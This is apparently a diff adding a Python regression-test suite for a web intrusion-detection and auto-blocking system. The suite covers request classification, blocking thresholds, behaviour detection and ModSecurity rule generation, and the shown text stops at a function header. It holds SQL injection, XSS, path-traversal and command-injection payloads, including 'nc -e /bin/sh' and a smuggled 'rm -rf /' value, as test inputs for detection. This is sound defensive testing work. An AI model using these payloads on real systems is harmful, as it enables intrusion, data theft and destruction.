@@ -1,0 +1,778 @@
+"""Bộ kiểm thử logic cho classifier / responder / tier3 / rulegen / enforcer.
+
+Chạy KHÔNG cần Docker, Kafka hay Elasticsearch (được giả lập):
+    python -B tests/test_logic.py
+Cần: scikit-learn, scipy, joblib (đúng phiên bản trong services/requirements.txt để nạp model).
+Mỗi mục kiểm tra một lỗi logic đã từng xảy ra, để lần sửa sau không tái phạm.
+"""
+import json, os, re, sys, types, warnings
+
+warnings.filterwarnings("ignore")
+ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+SVC = os.path.join(ROOT, "services")
+
+# ---- giả lập thư viện ngoài ----
+ck = types.ModuleType("confluent_kafka"); ck.Consumer = object; ck.Producer = object
+sys.modules["confluent_kafka"] = ck
+es_mod = types.ModuleType("elasticsearch"); es_mod.helpers = types.SimpleNamespace(); es_mod.Elasticsearch = object
+sys.modules["elasticsearch"] = es_mod
+sys.path.insert(0, SVC); sys.path.insert(0, os.path.join(ROOT, "web", "enforcer"))
+
+os.environ.update({
+    "MODEL_PATH": os.path.join(ROOT, "models", "tier2.joblib"),
+    "TIER3_MODEL": os.path.join(ROOT, "models", "tier3.joblib"),
+    "TIER2_THRESHOLD": "0.90",
+    # đúng giá trị trong docker-compose.yml
+    "MIN_CONFIDENCE": "0.90", "MAX_AGE_S": "600", "THRESHOLD": "5", "WINDOW_S": "60",
+    "LONG_WINDOW_S": "86400", "LONG_THRESHOLD": "12", "TTL_STEPS_S": "900,3600,86400", "MAX_TTL_S": "86400",
+    "EXEMPT_CIDRS": "127.0.0.0/8,10.10.30.0/24,10.10.10.10/32,10.10.10.20/32,172.16.0.0/12",
+    "INTERNAL_CIDRS": "10.10.30.0/24,10.10.10.10/32,172.16.0.0/12",
+    "MIN_CLUSTER": "5", "MIN_BENIGN": "100",
+})
+
+FAILS = []
+def check(name, cond, detail=""):
+    print(("  ok   " if cond else "  FAIL ") + name + (f"  [{detail}]" if detail and not cond else ""))
+    if not cond: FAILS.append(name)
+
+class FakeBuf:
+    def __init__(self): self.docs = []
+    def add(self, idx, doc, _id=None): self.docs.append(doc)
+    def maybe_flush(self, force=False): pass
+class FakeProd:
+    def __init__(self): self.msgs = []
+    def produce(self, topic, value=None, key=None): self.msgs.append((topic, key, json.loads(value)))
+    def flush(self, *_): pass
+    def poll(self, *_): pass
+
+# =====================================================================  common
+import common
+print("== common.parse_json_line")
+check("dòng JSON thường", common.parse_json_line(b'{"a":1}') == {"a": 1})
+check("escape \\xhh của Apache", common.parse_json_line(b'{"uri":"/a\\x0bb"}') == {"uri": "/a\x0bb"})
+check("escape \\v của Apache không làm mất sự kiện", common.parse_json_line(b'{"uri":"/a\\vb"}') == {"uri": "/a\x0bb"})
+check("'\\\\x41' (dấu \\ + x41) không bị sửa nhầm", common.parse_json_line(b'{"u":"\\\\x41\\x41"}') == {"u": "\\x41A"})
+check("byte UTF-8 dạng \\xhh ghép lại đúng tiếng Việt",
+      common.parse_json_line(b'{"uri":"/ch\\xc3\\xa0o"}') == {"uri": "/chào"})
+check("dòng hỏng trả None và được đếm", common.parse_json_line(b"{oops") is None and common.BAD_LINES["n"] >= 1)
+check("parse_ts kiểu Suricata (+0000)", abs(common.parse_ts("2026-11-09T09:00:00.500000+0000") - 1794214800.5) < 1e-3)
+check("parse_ts chuỗi rác trả default", common.parse_ts("khong-phai-ngay", 7) == 7)
+
+# =====================================================================  classifier
+import classifier as C
+C.ES_BUF, C.PROD = FakeBuf(), FakeProd()
+
+def cls(uri, query="", body="", ua="Mozilla/5.0"):
+    ev = {"uri": uri, "query": ("?" + query) if query else "", "body": body}
+    return C.classify(C.decode_p(uri).lower(), C.split_params(query), C.body_params(body), ua, ev)
+
+print("== classifier: URL lành tính không còn bị gán nhãn tấn công (N1)")
+BENIGN = [("/product.php", "id=482"), ("/product.php", "c=7&id=482"), ("/shop/list.php", "page=2&cat=shoes"),
+          ("/search", "q=laptop&type=new"), ("/x", "lang=vi&sh=1"), ("/x", "a=1&nc=123"), ("/x", "onload=1"),
+          ("/report", "date=2026-11-09&page=2"),
+          ("/x", "t=2026-11-09T10%3A00%3A00Z"), ("/x", "price=10-20&sort=asc"), ("/x", "email=alice%40example.com"),
+          ("/x", "q=C%2B%2B"), ("/x", "msg=xin+ch%C3%A0o"), ("/docs/a/b/c/d/e/f/guide.pdf", ""),
+          ("/x", "ref=newsletter&utm_source=mail&utm_campaign=nov"), ("/x", "q=select+a+plan"),
+          ("/vulnerabilities/sqli/", "id=laptop&Submit=Submit"), ("/vulnerabilities/sqli/", "id=order+by+price&Submit=Submit"),
+          ("/", "")]
+for u, q in BENIGN:
+    r = cls(u, q)
+    check(f"lành tính: {u}?{q}", r["label"] == "benign", f"{r['label']} tier{r['tier']} {r['rule']}")
+# Hai URL dưới đây KHÔNG còn bị regex tầng 1 bắt, nhưng model tầng 2 hiện tại (run_4) vẫn có thể
+# báo nhầm vì giá trị có ký tự cú pháp ('..', '='). Chỉ huấn luyện lại model mới hết hẳn — in ra để theo dõi.
+for u, q in [("/a", "redirect=..%2Fhome"), ("/x", "q=a+and+1%3D1")]:
+    r = cls(u, q)
+    check(f"tầng 1 không bắt nhầm: {u}?{q}", r["tier"] != 1, str(r))
+    if r["label"] != "benign":
+        print(f"       (giới hạn đã biết của model tầng 2: {u}?{q} -> {r['label']} {r['conf']:.2f})")
+r = cls("/login.php", "", "username=admin&password=password&Login=Login&user_token=0123456789abcdef0123456789abcdef")
+check("POST đăng nhập lành tính", r["label"] == "benign", str(r))
+r = cls("/vulnerabilities/exec/", "", "ip=8.8.8.8&Submit=Submit")
+check("POST ping lành tính", r["label"] == "benign", str(r))
+
+print("== classifier: tấn công vẫn bị bắt, có bằng chứng (trường + chuỗi khớp)")
+ATTACKS = [("sqli", "/vulnerabilities/sqli/", "id=1'%20OR%20'1'='1&Submit=Submit", ""),
+           ("sqli", "/vulnerabilities/sqli/", "id=1%20UNION%20SELECT%20user,password%20FROM%20users--&Submit=Submit", ""),
+           ("sqli", "/vulnerabilities/sqli/", "id=1'%20AND%20SLEEP(2)--&Submit=Submit", ""),
+           ("sqli", "/x", "id=1+or+1%3D1", ""),
+           ("sqli", "/vulnerabilities/sqli/", "id=1'%20AND%20extractvalue(1,concat(0x7e,version()))--%20-&Submit=Submit", ""),
+           ("xss", "/vulnerabilities/xss_r/", "name=%3Cscript%3Ealert(1)%3C/script%3E", ""),
+           ("xss", "/vulnerabilities/xss_r/", "name=%3Cimg%20src=x%20onerror=alert(1)%3E", ""),
+           ("lfi", "/vulnerabilities/fi/", "page=../../../../etc/passwd", ""),
+           ("lfi", "/vulnerabilities/fi/", "page=....//....//etc/passwd", ""),
+           ("lfi", "/x", "f=php://filter/convert.base64-encode/resource=index", ""),
+           ("rce", "/vulnerabilities/exec/", "", "ip=127.0.0.1%3Bcat+%2Fetc%2Fshadow&Submit=Submit"),
+           ("rce", "/vulnerabilities/exec/", "", "ip=127.0.0.1%7Cwhoami&Submit=Submit"),
+           ("rce", "/vulnerabilities/exec/", "", "ip=127.0.0.1%3Bid&Submit=Submit"),
+           ("rce", "/x", "c=%24(whoami)", ""),
+           ("recon", "/phpmyadmin/index.php", "", "")]
+for want, u, q, b in ATTACKS:
+    r = cls(u, q, b)
+    check(f"{want}: {u}?{q or b}"[:90], r["label"] == want and r["field"] and r["evidence"] is not None, str(r))
+r = cls("/vulnerabilities/sqli/", "id=1'%20OR%20'1'='1&Submit=Submit")
+check("bằng chứng nêu đúng tham số", r["field"] == "ARGS_GET:id", r["field"])
+r = cls("/x", "%3Cscript%3Ealert(1)%3C/script%3E=1")
+check("payload đặt ở TÊN tham số vẫn bị bắt", r["label"] == "xss", str(r))
+check("payload trong thân POST được tầng 1 thấy", cls("/vulnerabilities/exec/", "", "ip=127.0.0.1%3Bcat+/etc/passwd")["tier"] == 1)
+check("'c++' không bị giải mã '+' lần hai", C.decode_q("C%2B%2B") == "C++")
+check("mã hoá kép vẫn được giải", C.decode_q("%2527") == "'")
+
+print("== classifier: cổng cú pháp tầng 2 (N2 — giảm báo nhầm của model)")
+for q in ["date=2026-11-09&page=2", "t=2026-11-09T10:00:00Z", "price=10-20", "email=alice@example.com", "id=482"]:
+    ev = {"uri": "/x", "query": "?" + q, "body": ""}
+    gate = " ".join(v for _, v in C.split_params(q))
+    check(f"model không được hỏi cho '{q}'", C.tier2(ev, gate) is None)
+
+print("== classifier: sự kiện Suricata mang THỜI ĐIỂM SỰ KIỆN (C7)")
+buf, prod = FakeBuf(), FakeProd()
+C.handle_net({"event_type": "alert", "timestamp": "2026-11-09T09:00:00.000000+0000", "src_ip": "10.10.10.66",
+              "dest_ip": "10.10.10.10", "alert": {"signature": "ET WEB_SERVER SQL Injection", "category": "Web Application Attack",
+              "severity": 1, "metadata": {"signature_severity": ["Critical"]}}, "http": {"url": "/a?id=1"}}, buf, prod)
+check("alert net có ts = thời điểm cảm biến", prod.msgs and abs(prod.msgs[0][2]["ts"] - 1794214800.0) < 1)
+check("danh mục 'Command and Control' không bị gán rce",
+      C.suricata_class({"category": "Malware Command and Control Activity Detected", "signature": "ET MALWARE x"}) != "rce")
+buf, prod = FakeBuf(), FakeProd()
+C.handle_net({"event_type": "anomaly", "timestamp": "2026-11-09T09:00:00.000000+0000", "src_ip": "10.10.10.66",
+              "dest_ip": "10.10.10.10", "app_proto": "http", "anomaly": {"type": "applayer", "event": "INVALID_REQUEST_LINE"}}, buf, prod)
+check("yêu cầu HTTP dị dạng (C2) được gắn nhãn và báo", buf.docs[0]["label"] == "anomaly" and prod.msgs[0][2]["confidence"] < 0.9)
+
+print("== classifier: luồng web đầy đủ (ghép thân từ audit, lưu arg_n/arg_v)")
+C.ES_BUF, C.PROD = FakeBuf(), FakeProd()
+C.handle_web({"ts_ms": 1794214800000, "src_ip": "10.10.10.66", "method": "POST", "uri": "/vulnerabilities/exec/",
+              "query": "", "status": 302, "ua": "curl", "req_id": "R1"})
+check("POST chưa có audit thì chờ", "R1" in C.PENDING and not C.ES_BUF.docs)
+C.handle_audit({"transaction": {"transaction_id": "R1"}, "request": {"body": ["ip=127.0.0.1%3Bid&Submit=Submit"]},
+                "audit_data": {"action": {"intercepted": False}}})
+d = C.ES_BUF.docs[0]
+check("có audit -> phân loại ngay, thấy payload trong thân", d["label"] == "rce" and d["has_body"])
+check("lưu tên/giá trị tham số cho rulegen", d["arg_n"] == ["ip", "submit"] and d["arg_v"][0] == "127.0.0.1;id")
+check("waf_blocked lấy từ audit", d["waf_blocked"] is False)
+check("cảnh báo web mang ts sự kiện", abs(C.PROD.msgs[0][2]["ts"] - 1794214800.0) < 1e-6)
+check("không có Content-Type -> ModSecurity không tách thân: marg chỉ có query (rỗng)",
+      d["marg_n"] == [] and d["marg_body"] is False)
+C.ES_BUF, C.PROD = FakeBuf(), FakeProd()
+C.handle_web({"ts_ms": 1794214800000, "src_ip": "10.10.10.66", "method": "POST", "uri": "/vulnerabilities/exec/",
+              "query": "?x=%2527A%2BB", "status": 302, "ua": "curl", "req_id": "R2",
+              "ct": "application/x-www-form-urlencoded; charset=UTF-8"})
+C.handle_audit({"transaction": {"transaction_id": "R2"}, "request": {"body": ["ip=127.0.0.1%3BID&Submit=Submit"]},
+                "audit_data": {"action": {"intercepted": False}}})
+d = C.ES_BUF.docs[0]
+check("marg = ARGS như ModSecurity: giải mã MỘT lần, giữ hoa thường, gồm cả thân urlencoded",
+      d["marg_n"] == ["x", "ip", "Submit"] and d["marg_v"] == ["%27A+B", "127.0.0.1;ID", "Submit"] and d["marg_body"],
+      repr((d["marg_n"], d["marg_v"])))
+check("arg_v vẫn là góc nhìn của classifier (giải mã nhiều lần, chữ thường)", d["arg_v"][0] == "'a+b", repr(d["arg_v"]))
+
+# =====================================================================  responder
+import responder as R
+R.es_buf, R.prod = FakeBuf(), FakeProd()
+R.atomic_write = lambda *a: None
+clock = [2_000_000.0]
+R.time.time = lambda: clock[0]
+def alert(ip, cls="sqli", conf=0.9, source="web", target=None, age=0.0, **kw):
+    a = {"alert_id": "x", "ts": clock[0] - age, "src_ip": ip, "class": cls, "confidence": conf, "source": source, **kw}
+    if target is not None: a["target"] = target
+    R.decide(a); return R.es_buf.docs[-1]
+
+print("== responder: ngưỡng ngắn 5/60s hoạt động đúng (C1)")
+dec = []
+for i in range(5):
+    dec.append(alert("10.10.10.102", target=f"/a?id={i}")); clock[0] += 1
+check("4 cảnh báo đầu chỉ đếm", all(d["decision"] == "count" for d in dec[:4]), str([d["reason"] for d in dec]))
+check("cảnh báo thứ 5 mới chặn, lý do 'threshold'", dec[4]["decision"] == "block" and dec[4]["reason"] == "threshold", str(dec[4]))
+check("bản ghi kiểm toán có 'decided_by' và hạn chặn", dec[4].get("decided_by") and dec[4].get("expires") and dec[4]["ttl_s"] == 900)
+check("3 cảnh báo (kịch bản sqli của demo) KHÔNG bị chặn",
+      [alert("10.10.10.103", target=f"/b?{i}")["decision"] for i in range(3)] == ["count"] * 3)
+
+print("== responder: tấn công rải rác 1 request / 10 phút bị bắt bởi cửa sổ 24 giờ (B5)")
+dec = []
+for i in range(12):
+    dec.append(alert("10.10.10.200", target=f"/c?{i}")); clock[0] += 600
+check("11 lần đầu chưa chặn", all(d["decision"] == "count" for d in dec[:11]))
+check("lần thứ 12 chặn, lý do 'long_window'", dec[11]["decision"] == "block" and dec[11]["reason"] == "long_window", str(dec[11]))
+
+print("== responder: một request do 2 cảm biến báo chỉ tính 1 lần (C9)")
+clock[0] += 100000
+d1 = alert("10.10.10.220", target="/vulnerabilities/sqli/?id=1' or '1'='1&submit=submit")
+d2 = alert("10.10.10.220", source="net", conf=0.95, target="/vulnerabilities/sqli/?id=1'%20OR%20'1'='1&Submit=Submit")
+check("bản thứ hai từ Suricata là 'duplicate_sensor'", d1["decision"] == "count" and d2["reason"] == "duplicate_sensor", str(d2))
+d3 = alert("10.10.10.220", target="/vulnerabilities/sqli/?id=1' or '1'='1&submit=submit")
+check("cùng URL gửi LẦN NỮA vẫn được đếm", d3["decision"] == "count" and d3["reason"].startswith("2/5"), str(d3))
+
+print("== responder: lọc tuổi, độ tin cậy, miễn trừ, tái phạm")
+check("cảnh báo cũ hơn 10 phút bị bỏ", alert("10.10.10.230", age=601)["reason"] == "stale")
+check("cảnh báo 5 phút tuổi vẫn tính", alert("10.10.10.231", age=300)["decision"] == "count")
+check("độ tin cậy 0.85 < θ bị bỏ", alert("10.10.10.232", conf=0.85)["reason"] == "low_confidence")
+check("IP miễn trừ luôn bỏ qua trước tiên", alert("10.10.10.20", cls="behaviour", immediate=True)["reason"] == "exempt")
+ttl = []
+for i in range(4):
+    d = alert("10.10.10.210", cls="behaviour", source="behaviour", immediate=True)
+    ttl.append(d.get("ttl_s")); clock[0] += d["ttl_s"] + 11; R.sweep()
+check("TTL theo bậc của spec: 15 phút → 1 giờ → 24 giờ (E4)", ttl == [900, 3600, 86400, 86400], str(ttl))
+R.sweep(); clock[0] += 90000; R.sweep()
+check("bộ đếm hết hạn được dọn (không phình mãi)", len(R.hits) == 0 and len(R.seen) == 0, f"{len(R.hits)} {len(R.seen)}")
+
+print("== responder: lệnh quản trị qua nsm.control (nsmctl) — gỡ chặn / miễn trừ không xoá trạng thái")
+def ctl(cmd, age=0.0, **kw):
+    R.control({"cmd": cmd, "id": "t1", "ts": clock[0] - age, **kw}); return R.es_buf.docs[-1]
+clock[0] += 100000
+for i in range(5): alert("10.10.10.180", target=f"/a?id={i}' union select 1")
+alert("10.10.10.181", target="/a?id=1' or '1'='1")
+check("chuẩn bị: .180 đang bị chặn, .181 đang được đếm",
+      R.state["blocks"].get("10.10.10.180", {}).get("active") and "10.10.10.181" in R.hits)
+n_pub = len(R.prod.msgs)
+d = ctl("unblock", ip="10.10.10.180")
+check("unblock gỡ đúng một IP và ghi kiểm toán", d["decision"] == "unblock" and d["reason"] == "manual" and d["was_blocked"]
+      and "10.10.10.180" not in R.state["blocks"] and d["ctl_id"] == "t1", str(d))
+check("unblock phát lại danh sách chặn không còn IP đó",
+      len(R.prod.msgs) == n_pub + 1 and "10.10.10.180" not in R.prod.msgs[-1][2]["ips"])
+check("unblock không đụng tới bộ đếm của IP khác", "10.10.10.181" in R.hits)
+d = ctl("unblock", ip="10.10.10.180; rm -rf /")
+check("địa chỉ không hợp lệ bị từ chối", d["decision"] == "ctl_reject" and d["reason"] == "invalid_argument")
+d = ctl("unblock", ip="10.10.10.181", age=3600)
+check("lệnh cũ (phát lại sau 1 giờ) bị bỏ", d["decision"] == "ctl_reject" and d["reason"] == "stale" and "10.10.10.181" in R.hits)
+for i in range(5): alert("10.10.10.182", target=f"/b?id={i}' union select 1")
+d = ctl("exempt_add", cidr="10.10.10.182/31")
+check("exempt_add: thêm dải, gỡ luôn IP đang bị chặn trong dải, lưu vào trạng thái",
+      d["decision"] == "exempt_add" and "10.10.10.182" not in R.state["blocks"] and R.state["exempt_extra"] == ["10.10.10.182/31"], str(d))
+d = alert("10.10.10.183")
+check("IP trong dải miễn trừ thêm lúc chạy không bị đếm", d["decision"] == "skip" and d["reason"] == "exempt")
+d = ctl("exempt_del", cidr="10.10.10.20/32")
+check("exempt_del không bỏ được dải theo cấu hình", d["decision"] == "ctl_reject" and d["reason"] == "not_in_runtime_list")
+d = ctl("exempt_del", cidr="10.10.10.182/31")
+check("exempt_del bỏ dải đã thêm", d["decision"] == "exempt_del" and R.state["exempt_extra"] == [] and alert("10.10.10.183")["decision"] == "count")
+check("lệnh lạ bị từ chối", ctl("shutdown")["reason"] == "unknown_command")
+
+# =====================================================================  tier3
+import tier3 as T
+print("== tier3: cổng định hình và cửa sổ trượt (N5, T14)")
+def run_tier3(events, ip="10.10.10.107", t0=3_000_000.0, spread=3.0):
+    T.st.clear(); buf, prod = FakeBuf(), FakeProd()
+    T.time.time = lambda: t0 + spread + 1
+    for i, (uri, status, method, query) in enumerate(events):
+        T.add({"src_ip": ip, "ts_ms": (t0 + spread * i / max(len(events), 1)) * 1000, "uri": uri, "status": status,
+               "method": method, "query": query}, prod, buf)
+    T.time.time = lambda: t0 + spread + 4
+    T.sweep(prod, buf)
+    return prod.msgs
+m = run_tier3([(f"/secret_{i}.php", 404, "GET", "") for i in range(40)])
+check("dò 40 đường dẫn 404 -> báo 'recon'", m and m[0][2]["shape"] == "recon" and m[0][2]["immediate"], str(m[:1]))
+check("cảnh báo tầng 3 mang thời điểm sự kiện", m and m[0][2]["ts"] < 3_000_000.0 + 4)
+check("báo ngay trong đợt, không chờ hết phút", len(m) == 1)
+m = run_tier3([("/index.php", 302, "GET", "")] * 150)
+check("flood 150 request/phút -> báo 'flood'", m and m[0][2]["shape"] == "flood", str(m[:1]))
+m = run_tier3([("/login.php", 302, "POST", "")] * 60)
+check("dò mật khẩu 60 POST/phút -> báo 'bruteforce'", m and m[0][2]["shape"] == "bruteforce", str(m[:1]))
+m = run_tier3([("/login.php", 401, "GET", f"?u=a{i}") for i in range(20)])
+check("20 lần 401 liên tiếp -> báo 'denied'", m and m[0][2]["shape"] == "denied", str(m[:1]))
+check("trình duyệt: 1 trang + 19 file tĩnh KHÔNG bị báo",
+      not run_tier3([("/", 200, "GET", "")] + [(f"/static/f{i}.css", 200, "GET", "") for i in range(19)]))
+check("trình duyệt: 3 trang + 40 file tĩnh KHÔNG bị báo",
+      not run_tier3([(f"/p{i}", 200, "GET", "") for i in range(3)] + [(f"/static/f{i}.js", 200, "GET", "") for i in range(40)]))
+check("16 lượt tìm kiếm khác nhau KHÔNG bị báo", not run_tier3([("/search", 200, "GET", f"?q=tu{i}") for i in range(16)]))
+check("bot tìm kiếm 30 trang (200) KHÔNG bị báo", not run_tier3([(f"/bai-viet/{i}", 200, "GET", "") for i in range(30)]))
+check("IP nội bộ bị bỏ qua", not run_tier3([(f"/s{i}", 404, "GET", "") for i in range(40)], ip="10.10.30.5"))
+# sự kiện đến lệch thứ tự (đọc bù nhiều partition) không làm vỡ cửa sổ
+import random
+ev = [(f"/secret_{i}.php", 404, "GET", "") for i in range(40)]; random.Random(1).shuffle(ev)
+T.st.clear(); buf, prod = FakeBuf(), FakeProd(); T.time.time = lambda: 3_000_100.0
+order = list(range(40)); random.Random(2).shuffle(order)
+for k in order:
+    T.add({"src_ip": "10.10.10.107", "ts_ms": (3_000_000.0 + k * 0.05) * 1000, "uri": ev[k][0], "status": 404, "method": "GET", "query": ""}, prod, buf)
+check("sự kiện lệch thứ tự vẫn phát hiện được", len(prod.msgs) >= 1)
+
+# =====================================================================  rulegen
+import rulegen as G
+print("== rulegen: trích bất biến từ GIÁ TRỊ tham số (N4, C2, C3)")
+def corpus_of(urls):
+    c = G.Corpus()
+    for u in urls: c.add([v for _, v in G._split(u.split("?", 1)[1] if "?" in u else "")] or [u])
+    c.seal(); return c
+LAB = ["/vulnerabilities/sqli/?id=%s&submit=submit" % q for q in ["laptop", "chuot", "ban phim", "order by price"]] * 30
+corp = corpus_of(LAB + ["/index.php?q=laptop", "/vulnerabilities/fi/?page=include.php", "/vulnerabilities/xss_r/?name=alice"])
+def S(name, vals, extra=(("submit", "submit"),)): return [[(name, v)] + list(extra) for v in vals]
+sq = S("id", ["1' union select 1,2-- -", "1' union select user,pass-- -", "1' union select null,version()-- -",
+              "1' union select table_name,2 from dual-- -", "1' union select 3,4-- -"])
+tok, idx = G.invariant(sq, corp)
+check("sqli: bất biến là \"' union select\" (không dính đường dẫn, không dính số)", tok == "' union select", repr(tok))
+check("sqli: đích luật hẹp nhất ARGS:id", G.narrow_target(lambda v: tok in v, sq, idx) == "ARGS:id")
+for v in ["2' union select 1,2-- -", "99' union select a,b from t"]:
+    check(f"biến thể {v!r} vẫn bị luật bắt", tok in v)
+xs = S("name", ["<script>alert(1)</script>", "<script>alert(document.cookie)</script>", "<script>alert(2)</script>",
+                "<script>prompt(1)</script>", "<script>confirm(3)</script>"], extra=())
+tok, _ = G.invariant(xs, corp)
+check("xss: bất biến chứa thẻ script", tok is not None and "script>" in tok, repr(tok))
+lf = S("page", ["../../../../etc/passwd", "../../../etc/passwd", "../../etc/passwd", "....//....//etc/passwd", "/var/www/../../etc/passwd"], extra=())
+tok, _ = G.invariant(lf, corp)
+check("lfi: bất biến là '/etc/passwd'", tok == "/etc/passwd", repr(tok))
+toks = {G.invariant(sq, corp)[0] for _ in range(5)}
+check("kết quả tất định", len(toks) == 1)
+
+print("== rulegen: không thể sinh luật chỉ là tên endpoint / tên tham số (N4)")
+div = S("q", ["1' or '1'='1", "<svg/onload=alert(1)>", "../../etc/passwd", "1;waitfor delay '0:0:5'--", "admin'--",
+              "{{7*7}}", "1 and sleep(5)", "x' union all select null--"], extra=())
+tok, _ = G.invariant(div, corp)
+check("payload đa dạng vào một endpoint: không có luật 'chặn endpoint'", tok is None or ("orders" not in tok and "q=" not in tok), repr(tok))
+scn = [[("id", str(i)), ("ref", "home")] for i in range(1, 9)]
+check("URL bình thường của công cụ quét: không sinh luật", G.invariant(scn, corp)[0] is None)
+for t in ["&submit=submit", "?page=", "/api/v1/orders/search?q=", "id=1", "/shop/item.php"]:
+    check(f"is_specific({t!r}) = False", not G.is_specific(t))
+for t in ["' union select", "<script>", "../../etc/passwd", "'--"]:
+    check(f"is_specific({t!r}) = True", G.is_specific(t))
+check("nhãn scanner/recon không nằm trong lớp sinh luật", "scanner" not in G.ATTACK_LABELS and "recon" not in G.ATTACK_LABELS)
+
+print("== rulegen: luật RCE @rx không chặn URL lành tính (N3)")
+check("rx bắt payload thật", all(G.RCE_RE.search(v) for v in ["127.0.0.1;cat /etc/passwd", "127.0.0.1|nc -e /bin/sh", "127.0.0.1;id", "x && whoami", "a`id`"]))
+for v in ["482", "shoes", "new", "asc", "8h", "1", "laptop", "tom & jerry", "bed & head", "r&d type"]:
+    check(f"rx không khớp giá trị lành tính {v!r}", not G.RCE_RE.search(v))
+r = {"id": 9900000, "class": "rce", "token": G.RCE_RX, "op": "rx", "target": "ARGS:ip", "state": "active"}
+line = G.render(r)
+check("luật chỉ nhắm ARGS, không nhắm REQUEST_URI / User-Agent", line.startswith("SecRule ARGS:ip ") and "REQUEST_URI" not in line and "User-Agent" not in line)
+check("rule_hits tôn trọng tên tham số", G.rule_hits(r, {"arg": [("ip", "1;id")], "marg": []})
+      and not G.rule_hits(r, {"arg": [("q", "1;id")], "marg": []}))
+
+print("== rulegen: kiểm chứng corpus và kiểm tra tĩnh (C4, T13, L6)")
+c2 = corpus_of(["/s?q=it's a 'union select' tutorial"])
+check("token có trong lưu lượng lành tính bị loại", c2.rejects(token="union select"))
+check("token sạch thì không bị loại", not corp.rejects(token="' union select"))
+check("ε là tỷ lệ: 1/1000 mẫu khớp vẫn qua khi ε=1%", (setattr(G, "EPSILON", 0.01), corpus_of(["/s?q=x' or"] + ["/s?q=ok"] * 999).rejects(token="' or"), setattr(G, "EPSILON", 0.0))[1] is False)
+ok_rule = {"id": 9900001, "class": "sqli", "token": "' union select", "op": "contains", "target": "ARGS:id", "state": "shadow"}
+check("luật hợp lệ qua static_check", G.static_check(ok_rule))
+check("token chứa ${...} bị loại", not G.static_check({**ok_rule, "token": "cat${ifs}/etc/passwd"}))
+check("đích ngoài ARGS bị loại", not G.static_check({**ok_rule, "target": "REQUEST_URI|ARGS"}))
+check("regex lạ (không phải RCE_RX) bị loại", not G.static_check({**ok_rule, "op": "rx", "token": "(a+)+$"}))
+check("id ngoài dải tự sinh bị loại", not G.static_check({**ok_rule, "id": 942100}))
+
+print("== rulegen: một chu kỳ đầy đủ với Elasticsearch giả lập (bộ g0)")
+G.SELECTOR = "g0"
+class FakeES:
+    def __init__(self): self.indexed = {}; self.events = []; self.indices = types.SimpleNamespace(get=lambda **k: {}, delete=lambda **k: None)
+    def index(self, index, id, document): self.indexed[id] = document
+    def search(self, **k):
+        tot, bad = {}, {}
+        for e in self.events:
+            tot[e["src_ip"]] = tot.get(e["src_ip"], 0) + 1
+            if e["label"] != "benign": bad[e["src_ip"]] = bad.get(e["src_ip"], 0) + 1
+        return {"aggregations": {"ips": {"buckets": [{"key": i, "doc_count": n, "bad": {"doc_count": bad.get(i, 0)}}
+                                                     for i, n in tot.items()]}}}
+fes = FakeES(); G.es = fes; G.prod = FakeProd(); G.atomic_write = lambda *a: None
+def fake_scan(es, index, query, **k):
+    labels = None
+    for f in query["query"]["bool"]["filter"]:
+        if "terms" in f: labels = set(f["terms"]["label.keyword"])
+    for e in fes.events:
+        if labels is None or e["label"] in labels: yield {"_source": e}
+G.helpers.scan = fake_scan
+published = []
+G.publish = lambda conf: (published.append(conf), ("sha", True))[1]
+def web(ip, label, args, status=200):
+    return {"src_ip": ip, "label": label, "status": status, "target": "/t", "body": "",
+            "arg_n": [n for n, _ in args], "arg_v": [v for _, v in args]}
+G.state.clear(); G.state.update({"next_id": G.BASE_ID, "rules": {}})
+attack_events = [web(f"10.10.10.13{i % 2 + 3}", "sqli", s) for i, s in enumerate(sq * 2)]
+fes.events = attack_events + [web("10.10.10.20", "benign", [("id", "laptop"), ("submit", "submit")])] * 20
+G.cycle()
+check("corpus chưa đủ (20 < 100) -> KHÔNG sinh luật (an toàn khi hỏng)", not G.state["rules"])
+fes.events = attack_events + [web("10.10.10.20", "benign", [("id", "laptop"), ("submit", "submit")])] * 150 \
+             + [web("10.10.10.133", "benign", [("id", "1' union select 9,9-- -")])]      # mẫu tấn công bị gán nhầm benign
+G.cycle()
+rules = list(G.state["rules"].values())
+check("đủ corpus -> sinh 1 luật shadow cho sqli", len(rules) == 1 and rules[0]["state"] == "shadow", str(rules))
+check("mẫu 'benign' từ IP tấn công KHÔNG phủ quyết được luật (C5)", rules and rules[0]["token"] == "' union select")
+check("luật shadow dùng hành động pass", published and "pass,log" in published[-1] and "deny" not in published[-1])
+n_pub = len(published)
+G.cycle()
+check("tệp luật không đổi thì không phát lại (T2)", len(published) == n_pub)
+rules[0]["since"] -= G.SHADOW + 1
+G.cycle()
+check("hết thời gian chạy thử -> ban hành (deny)", rules[0]["state"] == "active" and "deny,status:403" in published[-1])
+fes.events.append(web("10.10.10.20", "benign", [("q", "it's ' union select tutorial")]))
+G.cycle()
+check("nguồn SẠCH có giá trị khớp -> luật bị thu hồi", rules[0]["state"] == "rejected" and rules[0]["reason"] == "benign_hit")
+G.helpers.scan = lambda *a, **k: (_ for _ in ()).throw(ConnectionError("ES down"))
+before = json.dumps(G.state, sort_keys=True)
+try: G.cycle(); raised = False
+except ConnectionError: raised = True
+check("Elasticsearch lỗi -> chu kỳ dừng, không đổi tập luật (E3)", raised and json.dumps(G.state, sort_keys=True) == before)
+
+print("== rulegen: một nhãn nhầm không làm mất corpus của người dùng hợp lệ")
+G.helpers.scan = fake_scan
+fes.events = [web("10.10.10.20", "benign", [("id", "laptop")])] * 100 + [web("10.10.10.20", "sqli", [("id", "order by price")])] \
+             + [web("10.10.10.66", "sqli", [("id", "1' or 1=1-- -")])] * 5 + [web("10.10.10.66", "benign", [("id", "1")])]
+bad_ips = G.attacker_ips(3600)
+check("1 nhãn tấn công / 101 request: vẫn là nguồn sạch", "10.10.10.20" not in bad_ips, str(bad_ips))
+check("IP tấn công thật (5/6 request): bị loại khỏi corpus", "10.10.10.66" in bad_ips, str(bad_ips))
+
+print("== rulegen: bộ chọn G2r (luật đặc tả theo góc nhìn ModSecurity)")
+import enforcer as F
+G.helpers.scan = fake_scan
+G.SELECTOR = "g2r"
+G.RULESEL_MODEL = os.path.join(ROOT, "models", "rulesel_g2r.joblib")
+G.RULESEL_PRIOR = os.path.join(ROOT, "models", "rulesel_prior.json.gz")
+G.g2r = G.load_selector()
+check("nạp được model G2r và kho nền đóng băng", G.g2r is not None)
+def mweb(ip, label, args, status=200):
